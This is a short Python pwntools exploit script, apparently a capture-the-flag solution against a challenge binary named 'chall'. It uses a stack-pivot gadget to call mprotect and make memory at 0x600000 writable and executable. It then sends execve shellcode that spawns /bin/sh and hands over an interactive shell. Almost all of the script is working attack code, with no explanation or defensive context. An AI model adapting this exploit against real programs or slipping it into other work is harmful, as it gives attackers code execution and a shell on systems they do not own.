from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'chall'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x004000e8 \n"
    gdb.attach(xp,cmd)

#Exploit Here
pivot = 0x004000e8 #mov eax, edi; mov esp, esi; cmp eax, 0xb; je 0x400290; int 0x80;

# 125 mprotect(0x600000,0x1000,7)
p =""
p += p64(0x600000)		#RBX
p += p64(0x7)		#RDX
p += p64(0x600000)		#RSI - esp
p += p64(0x1000)		#RCX
p += p64(5)		#RBP
p += p32(pivot)		#RIP
s(p)


sh = """
mov eax,0xb
mov ebx,0x600004
xor ecx,ecx
xor edx,edx
int 0x80
"""

p = ""
p += p32(0x600000+4+8)
p += "/bin/sh\x00"
p += asm(sh)
p += "\x90"*(0x7d-len(p))

s(p)


xp.interactive()
